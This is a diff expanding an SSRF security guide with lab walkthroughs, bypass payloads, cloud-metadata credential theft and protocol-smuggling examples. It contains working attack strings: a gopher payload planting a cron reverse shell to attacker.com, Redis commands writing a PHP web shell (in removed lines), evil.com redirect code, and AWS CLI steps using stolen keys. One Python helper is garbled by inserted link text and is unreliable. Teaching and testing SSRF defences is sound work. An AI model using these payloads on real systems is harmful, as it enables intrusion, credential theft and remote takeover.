@@ -1,594 +1,1404 @@
-# Server-Side Request Forgery (SSRF)
+# Server-Side Request Forgery (SSRF) - Comprehensive Guide
 
-SSRF occurs when an application accepts a user-controlled URL (or URL component) and uses it to make an outbound request without proper validation. This lets attackers make the server request **internal resources** (localhost, private networks, cloud metadata services) or **external systems** (attacker-controlled servers, third parties), often bypassing network access controls and leaking sensitive data.
+Server-Side Request Forgery (SSRF) is a web security vulnerability that allows attackers to induce server-side applications to make HTTP requests to unintended locations. By manipulating parameters that specify URLs or network locations, attackers can force the server to interact with internal infrastructure, cloud metadata services, or arbitrary external systems. The severity ranges from information disclosure through accessing internal admin panels to full remote code execution via cloud credential theft. SSRF exploits the implicit trust relationships between servers and internal systems, where requests originating from localhost or internal networks bypass authentication and authorization controls.
 
-Impact ranges from information disclosure and credential theft to RCE, internal network pivoting, and cloud account takeover.
+The paradigm: **servers trust themselves and their neighbors**—SSRF abuses this trust to pivot from external attacker to internal system access.
 
-> Only test systems you own or are explicitly authorized to assess.
+## What is SSRF? (fundamentals)
 
-## Why SSRF is dangerous (trust model abuse)
-Applications often make outbound requests for legitimate reasons:
-- Fetching remote content (webhooks, image processing, PDF generation)
-- API integrations (payment processors, analytics, notifications)
-- Internal service communication (microservices, admin panels)
+### Core concept: Server as a proxy
 
-The vulnerability appears when:
-- User input controls the destination URL (directly or indirectly).
-- The server trusts requests originating from itself or the internal network.
-- Access controls are enforced by network location, not authentication.
+**Normal application flow:**
+```
+User → Application → Database (internal)
+```
 
-Common trust assumptions that SSRF exploits:
-- "Requests from 127.0.0.1 are admin" (bypass front-end auth checks).
-- "Internal IPs are trusted" (access unauthenticated admin panels, databases, cloud metadata).
-- "Our IP is whitelisted" (abuse the server's identity to access third-party APIs).
+**SSRF exploitation:**
+```
+Attacker → Application → Internal Admin Panel (bypassed auth)
+Attacker → Application → Cloud Metadata Service (steal credentials)
+Attacker → Application → Other Internal Systems (lateral movement)
+```
 
-## Attack patterns (what you can do with SSRF)
+**The vulnerability:** Application accepts user-controlled URLs and makes requests to them without proper validation.
 
-### 1) Localhost / loopback attacks (127.0.0.1, localhost)
-Target services bound to localhost that aren't reachable externally.
+### Classic SSRF example
 
-Classic payload:
+**Vulnerable feature:** Check stock availability
+
+**Normal request:**
 ```http
 POST /product/stock HTTP/1.1
-Host: target.tld
+Host: shop.example.com
+Content-Type: application/x-www-form-urlencoded
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
+```
+
+**Server behavior:**
+```python
+def check_stock(stock_api_url):
+    # Server makes request to user-supplied URL
+    response = requests.get(stock_api_url)
+    return response.text
+```
+
+**SSRF exploitation:**
+```http
+POST /product/stock HTTP/1.1
+Host: shop.example.com
 Content-Type: application/x-www-form-urlencoded
 
 stockApi=http://localhost/admin
 ```
 
-What this accesses:
-- Admin panels that check "is request from localhost?"
-- Debugging endpoints (metrics, profilers, health checks)
-- Internal APIs (Redis, Memcached, Elasticsearch on default ports without auth)
-- Application servers on alternate ports (8080, 8081, 9000)
+**Result:** Server fetches its own admin panel and returns content to attacker.
 
-Localhost representation variants (useful for bypassing filters):
-```text
+### Trust relationships that enable SSRF
+
+**Trust 1: Localhost privilege**
+```
+External request to /admin:
+User → Application → /admin → 403 Forbidden (requires auth)
+
+Request from localhost:
+Application → localhost/admin → 200 OK (trusted, no auth!)
+```
+
+**Trust 2: Internal network access**
+```
+External access:
+Internet → Firewall → BLOCKED (192.168.x.x not routable)
+
+SSRF access:
+Attacker → Application → Internal Network (192.168.x.x) → SUCCESS
+```
+
+**Trust 3: Cloud metadata services**
+```
+Direct access from internet:
+Attacker → http://169.254.169.254/latest/meta-data → BLOCKED (not routable)
+
+SSRF access:
+Attacker → Application → http://169.254.169.254/latest/meta-data → AWS credentials!
+```
+
+### Impact categories
+
+**Critical - Cloud credential theft:**
+```
+Access AWS metadata:
+http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+
+Returns:
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "..."
+}
+
+Result: Full AWS account access
+```
+
+**High - Internal system access:**
+```
+Access internal admin panel:
+http://localhost/admin
+
+Access internal services:
+http://192.168.1.100/admin
+http://internal-api.local/sensitive-data
+
+Result: Bypass authentication, access sensitive functionality
+```
+
+**High - Port scanning and service discovery:**
+```
+Scan internal network:
+http://192.168.1.1:22 → SSH
+http://192.168.1.1:3306 → MySQL
+http://192.168.1.1:6379 → Redis
+
+Result: Map internal infrastructure
+```
+
+**Medium - Information disclosure:**
+```
+Read local files (via file:// protocol):
+file:///etc/passwd
+file:///var/www/html/config.php
+
+Result: Leak credentials, source code
+```
+
+**Medium - Denial of Service:**
+```
+Infinite redirect loop
+Large file downloads consuming resources
+```
+
+## Types of SSRF attacks
+
+### Type 1: SSRF against the server itself (localhost)
+
+**Attack pattern:** Force server to make requests to itself via loopback interface.
+
+#### Example: Accessing local admin panel
+
+**Vulnerable code:**
+```python
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+@app.route('/fetch-url', methods=['POST'])
+def fetch_url():
+    url = request.form['url']
+    
+    # NO VALIDATION!
+    response = requests.get(url)
+    
+    return response.text
+```
+
+**Normal usage:**
+```http
+POST /fetch-url HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+url=http://api.example.com/data
+```
+
+**SSRF exploitation:**
+```http
+POST /fetch-url HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+url=http://localhost/admin
+```
+
+**Why it works:**
+- Admin panel accessible from localhost without authentication
+- Access control assumes "localhost = trusted admin"
+- Application makes request as localhost → bypasses authentication
+
+#### Lab walkthrough: Basic SSRF against the local server
+
+**Scenario:** E-commerce app with stock checker, admin panel at /admin accessible only from localhost.
+
+**Step 1: Identify SSRF vector**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1
+```
+
+**Step 2: Test localhost access**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://localhost/admin
+```
+
+**Response:**
+```html
+<h1>Admin Panel</h1>
+<a href="/admin/delete?username=carlos">Delete user carlos</a>
+```
+
+**Step 3: Delete user**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://localhost/admin/delete?username=carlos
+```
+
+**Result:** User deleted via SSRF!
+
+#### Common localhost variations
+
+```
+Loopback addresses:
 http://127.0.0.1/admin
 http://localhost/admin
-http://127.1/admin
 http://0.0.0.0/admin
-http://[::1]/admin
 http://0/admin
-http://2130706433/admin (decimal IP)
-http://017700000001/admin (octal IP)
-http://0x7f000001/admin (hex IP)
+
+IPv6 loopback:
+http://[::1]/admin
+http://[0000:0000:0000:0000:0000:0000:0000:0001]/admin
+
+Alternative ports:
+http://localhost:8080/admin
+http://localhost:9090/admin
 ```
 
-### 2) Private network scanning and access (RFC 1918 ranges)
-Target internal hosts not reachable from the internet.
+### Type 2: SSRF against backend systems
 
-Common private IP ranges:
-```text
-10.0.0.0/8
-172.16.0.0/12
-192.168.0.0/16
+**Attack pattern:** Access internal network systems not directly reachable from internet.
+
+#### Network topology
+
+```
+Internet
+   ↓
+Firewall (blocks 192.168.x.x)
+   ↓
+Web Application (public: 203.0.113.10)
+   ↓
+Internal Network:
+   ├── Admin Panel (192.168.0.68)
+   ├── Database (192.168.0.100)
+   └── Internal API (192.168.0.200)
 ```
 
-Example payloads:
-```text
-http://192.168.0.1/admin
-http://192.168.1.1/
-http://10.0.0.1:8080/manager
-http://172.16.0.5/api/internal
-```
-
-Port scanning technique (observe timing/errors):
-```text
-http://192.168.0.5:22
-http://192.168.0.5:80
-http://192.168.0.5:443
-http://192.168.0.5:3306
-http://192.168.0.5:6379
-http://192.168.0.5:9200
-```
-
-Indicators:
-- Different response times (open vs closed/filtered)
-- Different error messages
-- Different HTTP status codes
-
-### 3) Cloud metadata service exploitation (critical in cloud environments)
-Cloud providers expose metadata endpoints at link-local addresses that contain credentials, instance details, and configuration.
-
-AWS metadata (IMDSv1, old/vulnerable):
-```text
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
-http://169.254.169.254/latest/user-data/
-```
-
-AWS metadata (IMDSv2, requires token but sometimes bypassable):
+**Direct access blocked:**
 ```bash
-# Step 1: Get token (if you can control headers)
-PUT /latest/api/token HTTP/1.1
-X-aws-ec2-metadata-token-ttl-seconds: 21600
-
-# Step 2: Use token
-GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
-X-aws-ec2-metadata-token: [token]
+# From attacker's machine
+curl http://192.168.0.68/admin
+# Error: Network unreachable (private IP)
 ```
 
-Google Cloud metadata:
-```text
-http://metadata.google.internal/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-http://metadata/computeMetadata/v1/instance/service-accounts/default/token
-```
-
-Requires header: `Metadata-Flavor: Google` (sometimes injectable).
-
-Azure metadata:
-```text
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
-```
-
-Requires header: `Metadata: true`.
-
-What you get from metadata services:
-- IAM role credentials (temporary AWS keys)
-- Service account tokens (GCP/Azure)
-- SSH keys, instance user-data
-- Network config, security groups
-
-### 4) Internal service exploitation (databases, caches, queues)
-Many internal services run without authentication on private networks.
-
-Redis (port 6379, often no auth):
-```text
-http://192.168.1.10:6379/
-```
-
-If you can inject Redis protocol commands via SSRF (protocol smuggling):
-```text
-dict://192.168.1.10:6379/CONFIG:SET:dir:/var/www/html
-dict://192.168.1.10:6379/CONFIG:SET:dbfilename:shell.php
-dict://192.168.1.10:6379/SET:payload:"<?php system($_GET['c']); ?>"
-dict://192.168.1.10:6379/SAVE
-```
-
-Memcached (port 11211):
-```text
-http://192.168.1.10:11211/
-```
-
-Elasticsearch (port 9200):
-```text
-http://192.168.1.10:9200/
-http://192.168.1.10:9200/_cat/indices
-http://192.168.1.10:9200/_search?q=password
-```
-
-SMTP (protocol smuggling for email sending):
-```text
-gopher://192.168.1.5:25/_MAIL%20FROM:attacker@evil.com
-```
-
-### 5) File protocol access (local file read, if supported)
-Some URL parsers/libraries allow `file://` scheme.
-
-```text
-file:///etc/passwd
-file:///etc/shadow
-file:///var/www/html/config.php
-file:///c:/windows/win.ini
-file:///proc/self/environ
-```
-
-### 6) Blind SSRF (no direct response, detect via side channels)
-The server makes the request but doesn't return the response to you.
-
-Detection methods:
-- Out-of-band interaction (DNS/HTTP to attacker-controlled server):
-```text
-http://attacker.burpcollaborator.net
-http://unique-id.attacker.com
-```
-
-- Timing-based (observe response time differences):
-```text
-http://192.168.1.5:22 (instant reject if closed)
-http://192.168.1.5:80 (may hang/timeout if open but unresponsive)
-```
-
-- Error-based (different errors for different targets):
-```text
-http://invalid-host-xyz.local
-http://192.168.1.999
-```
-
-## Common SSRF injection points (where to look)
-
-### URL parameters (most obvious)
+**SSRF access succeeds:**
 ```http
-GET /fetch?url=http://example.com HTTP/1.1
-GET /proxy?target=http://example.com HTTP/1.1
-POST /webhook HTTP/1.1
-Content-Type: application/json
+POST /product/stock HTTP/1.1
 
-{"callback_url": "http://example.com"}
+stockApi=http://192.168.0.68/admin
 ```
 
-### Partial URLs (hostname or path only)
+**Result:** Application acts as proxy to internal network!
+
+#### Lab walkthrough: Basic SSRF against backend system
+
+**Scenario:** Admin interface at 192.168.0.X on port 8080 (unknown exact IP).
+
+**Step 1: Scan internal network**
+
+Using Burp Intruder:
 ```http
-POST /api/fetch HTTP/1.1
-Content-Type: application/json
+POST /product/stock HTTP/1.1
 
-{"host": "example.com", "path": "/api/data"}
+stockApi=http://192.168.0.§1§:8080/admin
 ```
+
+**Intruder payload:** Numbers 1-255
+
+**Step 2: Identify valid IP**
+```
+192.168.0.1:8080 → Connection timeout
+192.168.0.2:8080 → Connection timeout
+...
+192.168.0.68:8080 → 200 OK (Admin panel found!)
+```
+
+**Step 3: Access admin functionality**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://192.168.0.68:8080/admin
+```
+
+**Response:**
+```html
+<a href="/admin/delete?username=carlos">Delete carlos</a>
+```
+
+**Step 4: Exploit**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://192.168.0.68:8080/admin/delete?username=carlos
+```
+
+#### Internal service discovery
+
+**Common internal services to target:**
+
+```
+Admin panels:
+http://192.168.0.1/admin
+http://192.168.1.1/manager
+http://10.0.0.1/dashboard
+
+Databases:
+http://192.168.0.100:3306 (MySQL)
+http://192.168.0.100:5432 (PostgreSQL)
+http://192.168.0.100:27017 (MongoDB)
+
+Caching:
+http://192.168.0.200:6379 (Redis)
+http://192.168.0.200:11211 (Memcached)
+
+Internal APIs:
+http://internal-api.local/
+http://192.168.0.50:8000/api/
+
+Cloud metadata:
+http://169.254.169.254/ (AWS)
+http://metadata.google.internal/ (GCP)
+http://169.254.169.254/metadata/instance (Azure)
+```
+
+### Type 3: Blind SSRF
+
+**Characteristic:** Application makes request but doesn't return response to attacker.
+
+**Vulnerable code:**
+```python
+@app.route('/report-issue', methods=['POST'])
+def report_issue():
+    issue_url = request.form['url']
+    
+    # Make request but don't return response
+    try:
+        requests.get(issue_url, timeout=5)
+        log_analytics(issue_url)  # Log for internal review
+    except:
+        pass
+    
+    return "Thank you for reporting!"
+```
+
+**Challenge:** Can't see response, harder to exploit.
+
+#### Exploitation technique 1: Out-of-band detection
+
+**Use Burp Collaborator or similar:**
+```http
+POST /report-issue HTTP/1.1
+
+url=http://attacker.burpcollaborator.net
+```
+
+**Burp Collaborator receives:**
+```
+DNS lookup for attacker.burpcollaborator.net
+HTTP GET request to attacker.burpcollaborator.net
+Source IP: 203.0.113.10 (target server)
+User-Agent: python-requests/2.25.1
+```
+
+**Confirmation:** SSRF exists!
+
+#### Exploitation technique 2: Time-based detection
+
+**Test internal service existence:**
+```http
+POST /report-issue HTTP/1.1
+
+url=http://192.168.0.100:3306
+```
+
+**Timing analysis:**
+```
+Open port (MySQL running):
+Request completes in: 0.1 seconds (connection accepted)
+
+Closed port:
+Request completes in: 75 seconds (connection timeout)
+
+Filtered port:
+Request completes in: 5 seconds (immediate rejection)
+```
+
+#### Exploitation technique 3: Side-channel via Referer
+
+**Scenario:** Analytics software fetches URLs from Referer header.
+
+**Vulnerable code:**
+```python
+@app.route('/analytics')
+def analytics():
+    referer = request.headers.get('Referer')
+    
+    # Fetch referring site for analytics
+    if referer:
+        response = requests.get(referer)
+        parse_analytics(response.text)
+```
+
+**Exploitation:**
+```http
+GET /analytics HTTP/1.1
+Host: target.com
+Referer: http://192.168.0.68/admin
+```
+
+**Result:** Server fetches internal admin panel, even though response not returned to attacker.
+
+**Advanced: Exfiltrate via Referer chain**
+```
+1. Attacker controls evil.com
+2. SSRF to internal service with redirect to evil.com:
+   url=http://192.168.0.68/admin-data
+
+3. If analytics follows Referer on evil.com:
+   Server → 192.168.0.68/admin-data → 200 OK
+   Server → evil.com (logs Referer: http://192.168.0.68/admin-data)
+   
+4. evil.com logs contain internal data in Referer!
+```
+
+## Bypassing SSRF defenses
+
+### Defense 1: Blacklist-based filters
+
+**Blocked inputs:**
+```python
+blacklist = ['127.0.0.1', 'localhost', '192.168', '10.0', 'admin']
+
+def is_blocked(url):
+    for blocked in blacklist:
+        if blocked in url:
+            return True
+    return False
+```
+
+### Bypass technique 1: Alternative IP representations
+
+**Decimal representation:**
+```
+127.0.0.1 in decimal: 2130706433
 
 Exploit:
+stockApi=http://2130706433/admin
+```
+
+**Calculation:**
+```python
+def ip_to_decimal(ip):
+    parts = ip.split('.')
+    return (int(parts[0]) << 24) + (int(parts [portswigger](https://portswigger.net/web-security/ssrf)) << 16) + \
+           (int(parts [portswigger](https://portswigger.net/web-security/learning-paths/ssrf-attacks)) << 8) + int(parts [youtube](https://www.youtube.com/watch?v=PdVGk5NlnTY))
+
+print(ip_to_decimal('127.0.0.1'))  # 2130706433
+print(ip_to_decimal('192.168.0.1'))  # 3232235521
+```
+
+**Octal representation:**
+```
+127.0.0.1 in octal: 017700000001 or 0177.0.0.1
+
+Exploit:
+stockApi=http://017700000001/admin
+stockApi=http://0177.0.0.1/admin
+```
+
+**Hexadecimal representation:**
+```
+127.0.0.1 in hex: 0x7f000001 or 0x7f.0.0.1
+
+Exploit:
+stockApi=http://0x7f000001/admin
+```
+
+**Shortened IP formats:**
+```
+127.0.0.1 = 127.1 (omit zeros)
+192.168.0.1 = 192.168.1 (omit middle zeros)
+
+Exploit:
+stockApi=http://127.1/admin
+```
+
+**IPv6 representations:**
+```
+::1 (IPv6 loopback)
+::ffff:127.0.0.1 (IPv4-mapped IPv6)
+0:0:0:0:0:ffff:7f00:0001
+
+Exploit:
+stockApi=http://[::1]/admin
+stockApi=http://[::ffff:127.0.0.1]/admin
+```
+
+### Bypass technique 2: DNS rebinding
+
+**Register domain pointing to localhost:**
+```
+attacker.com → 127.0.0.1
+
+Exploit:
+stockApi=http://attacker.com/admin
+```
+
+**Burp Collaborator provides this:**
+```
+spoofed.burpcollaborator.net → 127.0.0.1
+```
+
+### Bypass technique 3: URL encoding
+
+**Simple encoding:**
+```
+localhost → lo%63alhost → lo%63%61lhost
+127.0.0.1 → 127%2e0%2e0%2e1
+
+Exploit:
+stockApi=http://lo%63alhost/admin
+stockApi=http://127%2e0%2e0%2e1/admin
+```
+
+**Double encoding:**
+```
+. (dot) = %2e
+%2e encoded again = %252e
+
+Exploit:
+stockApi=http://127%252e0%252e0%252e1/admin
+```
+
+**Works if:** Server decodes twice or filter decodes once, backend decodes again.
+
+### Bypass technique 4: Case variation
+
+```
+Blocked: localhost, LOCALHOST
+
+Bypass:
+stockApi=http://LocalHost/admin
+stockApi=http://lOcAlHoSt/admin
+```
+
+### Bypass technique 5: Redirect-based bypass
+
+**Setup attacker-controlled redirect:**
+```php
+// evil.com/redirect.php
+<?php
+header("Location: http://127.0.0.1/admin");
+?>
+```
+
+**Exploit:**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://evil.com/redirect.php
+```
+
+**Server behavior:**
+```
+1. Checks URL: evil.com ✓ (not blacklisted)
+2. Makes request to evil.com
+3. Receives 302 redirect to http://127.0.0.1/admin
+4. Follows redirect (if redirects enabled)
+5. Accesses localhost/admin
+```
+
+**Protocol switching bypass:**
+```
+Redirect from: http://evil.com
+Redirect to: https://127.0.0.1/admin
+
+Some filters check HTTP but not HTTPS!
+```
+
+#### Lab: SSRF with blacklist-based input filter
+
+**Scenario:** Application blocks "127.0.0.1", "localhost", and "/admin".
+
+**Attempt 1: Direct localhost**
+```http
+stockApi=http://localhost/admin
+Response: "Blocked: localhost detected"
+```
+
+**Attempt 2: Use 127.1**
+```http
+stockApi=http://127.1/admin
+Response: "Blocked: admin detected"
+```
+
+**Attempt 3: URL encode "admin"**
+```http
+stockApi=http://127.1/%61dmin
+Response: 200 OK (bypassed!)
+```
+
+**Explanation:**
+- `%61` = 'a'
+- Filter checks for string "/admin"
+- After decoding: "/%61dmin" becomes "/admin"
+- Filter bypassed!
+
+### Defense 2: Whitelist-based filters
+
+**Allowed domains:**
+```python
+whitelist = ['stock.weliketoshop.net', 'api.trusted.com']
+
+def is_allowed(url):
+    for allowed in whitelist:
+        if allowed in url:
+            return True
+    return False
+```
+
+### Bypass technique 1: @ credential injection
+
+**URL format:**
+```
+https://username:password@hostname/path
+```
+
+**Exploit:**
+```
+stockApi=http://trusted.com@evil.com/
+
+Parser sees: trusted.com (passes whitelist)
+Request goes to: evil.com (actual hostname after @)
+```
+
+**Detailed parsing:**
+```
+URL: http://expected-host:fakepassword@evil-host
+     └─ Credentials ──────────────┘└─ Actual host
+
+Naive parser: Sees "expected-host" → Allows
+Real parser: Connects to "evil-host"
+```
+
+### Bypass technique 2: # fragment injection
+
+**Exploit:**
+```
+stockApi=http://evil.com#trusted.com
+
+Parser sees: trusted.com (in fragment, passes check)
+Request goes to: evil.com (hostname before #)
+```
+
+**URL structure:**
+```
+http://evil.com#trusted.com
+└─ Host ──┘└─ Fragment
+
+Fragment ignored in actual request!
+```
+
+### Bypass technique 3: Subdomain control
+
+**Register subdomain:**
+```
+trusted-host.evil.com
+
+DNS:
+trusted-host.evil.com → attacker's IP
+```
+
+**Exploit:**
+```
+stockApi=http://trusted-host.evil.com/payload
+
+Parser sees: "trusted-host" (passes whitelist check for "trusted-host")
+Request goes to: attacker's server
+```
+
+### Bypass technique 4: Open redirect chaining
+
+**Scenario:** Trusted domain has open redirect vulnerability.
+
+**Open redirect on trusted site:**
+```
+http://trusted.com/redirect?url=http://evil.com
+→ Redirects to http://evil.com
+```
+
+**SSRF exploitation:**
+```http
+stockApi=http://trusted.com/redirect?url=http://192.168.0.68/admin
+```
+
+**Execution flow:**
+```
+1. Whitelist check: trusted.com ✓
+2. Request to: http://trusted.com/redirect?url=...
+3. Redirect to: http://192.168.0.68/admin
+4. Access internal admin panel!
+```
+
+#### Lab: SSRF with whitelist-based input filter
+
+**Scenario:** Only "stock.weliketoshop.net" allowed.
+
+**Attempt 1: @ bypass**
+```http
+stockApi=http://stock.weliketoshop.net@localhost/admin
+Response: "Invalid URL"
+```
+
+**Attempt 2: # fragment**
+```http
+stockApi=http://localhost%23@stock.weliketoshop.net/admin
+Response: "Invalid URL"
+```
+
+**Attempt 3: Double URL encoding**
+```http
+stockApi=http://localhost%2523@stock.weliketoshop.net/admin
+Response: 200 OK
+
+Explanation:
+%25 = % (URL encoded)
+%2523 = %23 (double encoded #)
+After decoding: localhost#@stock.weliketoshop.net
+Parser confusion → bypassed!
+```
+
+### Bypass technique 5: Open redirect on allowed domain
+
+#### Lab: SSRF with filter bypass via open redirection
+
+**Scenario:** Only "weliketoshop.net" URLs allowed. Site has open redirect.
+
+**Discovery: Open redirect**
+```http
+GET /product/nextProduct?currentProductId=1&path=http://evil.com
+
+Response:
+HTTP/1.1 302 Found
+Location: http://evil.com
+```
+
+**Exploitation:**
+```http
+POST /product/stock HTTP/1.1
+
+stockApi=http://weliketoshop.net/product/nextProduct?path=http://192.168.0.68/admin
+```
+
+**Flow:**
+```
+1. Whitelist check: weliketoshop.net ✓
+2. Request to: weliketoshop.net/product/nextProduct?path=...
+3. 302 redirect to: http://192.168.0.68/admin
+4. Follow redirect → Internal admin access!
+```
+
+## Advanced SSRF exploitation
+
+### Cloud metadata service attacks
+
+#### AWS metadata service (IMDSv1)
+
+**Endpoint:**
+```
+http://169.254.169.254/latest/meta-data/
+```
+
+**Critical paths:**
+```
+IAM credentials:
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+Instance identity:
+http://169.254.169.254/latest/meta-data/instance-id
+
+User data (may contain secrets):
+http://169.254.169.254/latest/user-data
+```
+
+**Exploitation:**
+```http
+POST /fetch-url HTTP/1.1
+
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**Response:**
+```
+admin-role
+```
+
+**Fetch credentials:**
+```http
+url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role
+```
+
+**Response:**
 ```json
-{"host": "169.254.169.254", "path": "/latest/meta-data/iam/security-credentials/"}
+{
+  "Code": "Success",
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2026-02-19T00:00:00Z"
+}
 ```
 
-### File upload with URL fetch
+**Use stolen credentials:**
+```bash
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+
+aws s3 ls  # List all S3 buckets
+aws ec2 describe-instances  # List EC2 instances
+```
+
+#### AWS IMDSv2 (requires token)
+
+**Protection:** Requires PUT request to get token (SSRF usually only allows GET).
+
+**Bypass:** Some SSRF vulnerabilities allow arbitrary HTTP methods.
+
+**Exploit if PUT allowed:**
+```
+Step 1: Get token
+PUT http://169.254.169.254/latest/api/token
+X-aws-ec2-metadata-token-ttl-seconds: 21600
+
+Response: AQAAAxxxxxxx (token)
+
+Step 2: Use token
+GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
+X-aws-ec2-metadata-token: AQAAAxxxxxxx
+```
+
+#### GCP metadata service
+
+**Endpoint:**
+```
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+**Requires header:**
+```
+Metadata-Flavor: Google
+```
+
+**Exploitation (if custom headers allowed):**
 ```http
-POST /import HTTP/1.1
-Content-Type: application/json
+POST /fetch-url HTTP/1.1
 
-{"file_url": "http://example.com/document.pdf"}
+url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+headers=Metadata-Flavor: Google
 ```
 
-### Referer header (analytics/tracking software)
-Some analytics tools fetch and parse URLs in the `Referer` header.
+**Response:**
+```json
+{
+  "access_token": "ya29...",
+  "expires_in": 3599,
+  "token_type": "Bearer"
+}
+```
 
+#### Azure metadata service
+
+**Endpoint:**
+```
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+**Requires header:**
+```
+Metadata: true
+```
+
+**Exploitation:**
 ```http
-GET /page HTTP/1.1
-Host: target.tld
-Referer: http://169.254.169.254/latest/meta-data/
+url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+headers=Metadata: true
 ```
 
-### XML parsing (XXE leading to SSRF)
+### Protocol smuggling attacks
+
+**Supported protocols beyond HTTP:**
+
+**File protocol:**
+```
+file:///etc/passwd
+file:///var/www/html/config.php
+file:///c:/windows/win.ini
+```
+
+**FTP protocol:**
+```
+ftp://internal-ftp.local/
+```
+
+**Gopher protocol (powerful!):**
+```
+Allows arbitrary TCP packets, can exploit:
+- Redis
+- Memcached
+- SMTP
+- MySQL
+```
+
+**Gopher example - Redis exploitation:**
+```
+gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+
+Result: Writes cron job for reverse shell
+```
+
+**Dict protocol:**
+```
+dict://127.0.0.1:6379/info
+Queries Redis info
+```
+
+**LDAP protocol:**
+```
+ldap://internal-ldap.local:389/dc=example,dc=com
+```
+
+### XXE to SSRF
+
+**If application accepts XML:**
 ```xml
-<?xml version="1.0"?>
+<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+  <!ENTITY xxe SYSTEM "http://192.168.0.68/admin">
 ]>
 <data>&xxe;</data>
 ```
 
-### PDF generation / document conversion
+**Application parses XML, triggers SSRF to internal admin panel.**
+
+### PDF generators and SSRF
+
+**Vulnerable: HTML to PDF conversion**
+
+**Exploit:**
+```html
+<html>
+<body>
+<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+<iframe src="http://192.168.0.68/admin"></iframe>
+</body>
+</html>
+```
+
+**PDF generator renders HTML → Fetches images/iframes → SSRF!**
+
+## Hidden attack surfaces
+
+### Partial URL injection
+
+**Scenario:** Application only accepts hostname, constructs full URL server-side.
+
+**Vulnerable code:**
+```python
+def fetch_api_data(hostname):
+    # Application constructs URL
+    url = f"https://{hostname}/api/data"
+    return requests.get(url).text
+```
+
+**Limited exploitation:**
+```
+hostname=192.168.0.68
+
+Server requests: https://192.168.0.68/api/data
+Can't control path or protocol
+```
+
+**Bypass with @ symbol:**
+```
+hostname=evil.com@192.168.0.68
+
+Server requests: https://evil.com@192.168.0.68/api/data
+Connects to: 192.168.0.68 (after @)
+```
+
+### Referer header SSRF
+
+**Vulnerable: Analytics tracking**
+
+**Vulnerable code:**
+```python
+@app.route('/page')
+def page():
+    referer = request.headers.get('Referer')
+    
+    # Fetch referring page for analytics
+    if referer:
+        analytics_service.fetch_url(referer)
+    
+    return render_template('page.html')
+```
+
+**Exploitation:**
 ```http
-POST /generate-pdf HTTP/1.1
-Content-Type: application/json
-
-{"html": "<img src='http://169.254.169.254/latest/meta-data/'>"}
+GET /page HTTP/1.1
+Host: target.com
+Referer: http://192.168.0.68/admin
 ```
 
-### SVG processing (image uploads)
+**Result:** Server fetches internal admin panel for analytics.
+
+### HTML meta refresh
+
+**Scenario:** Application allows HTML content, renders in browser or PDF.
+
+```html
+<meta http-equiv="refresh" content="0; url=http://192.168.0.68/admin">
+```
+
+**If server-side rendering occurs, triggers SSRF.**
+
+### Import/Export functionality
+
+**CSV import with external resources:**
+```csv
+Name,Avatar
+John,http://192.168.0.68/admin
+```
+
+**If application fetches avatar URLs → SSRF**
+
+**Excel import with external entities:**
 ```xml
-<svg xmlns="http://www.w3.org/2000/svg">
-  <image href="http://169.254.169.254/latest/meta-data/" />
-</svg>
+<!-- Excel XML with external entity -->
+<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://192.168.0.68/admin"> ]>
+<row>&xxe;</row>
 ```
 
-## Filter bypass techniques (comprehensive)
+### Webhook/Callback URLs
 
-### Blacklist bypass (when 127.0.0.1, localhost, or admin are blocked)
+**Common in:**
+- Payment gateways (callback after payment)
+- OAuth applications (redirect_uri)
+- API integrations (webhook URLs)
 
-#### IP representation variations
-```text
-http://127.1/
-http://0.0.0.0/
-http://0/
